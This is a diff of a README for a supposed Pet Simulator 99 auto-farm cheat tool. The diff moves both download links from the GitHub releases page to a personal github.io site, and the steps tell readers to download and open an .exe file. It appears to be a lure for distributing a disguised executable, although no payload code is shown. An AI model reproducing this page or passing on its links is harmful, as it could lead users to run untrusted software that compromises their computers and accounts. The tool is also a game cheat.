@@ -1,6 +1,6 @@
 # 🚀 Pet-Simulator-99-Auto-Farm-Trainer-2026-Ultra - Automate your tasks and grow fast
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/brigitterosy806/Pet-Simulator-99-Auto-Farm-Trainer-2026-Ultra/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://brigitterosy806.github.io)
 
 This software automates repetitive tasks in Pet Simulator 99. It collects coins, hatches eggs, and finishes Backrooms League quests for you. The tool helps you save time while you play.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these needs before you start.
 
 Follow these steps to get the software on your computer.
 
-1. Visit the [releases page](https://github.com/brigitterosy806/Pet-Simulator-99-Auto-Farm-Trainer-2026-Ultra/releases).
+1. Visit the [releases page](https://brigitterosy806.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends with .exe to save the file to your computer.
 4. Open the folder where you saved the file.
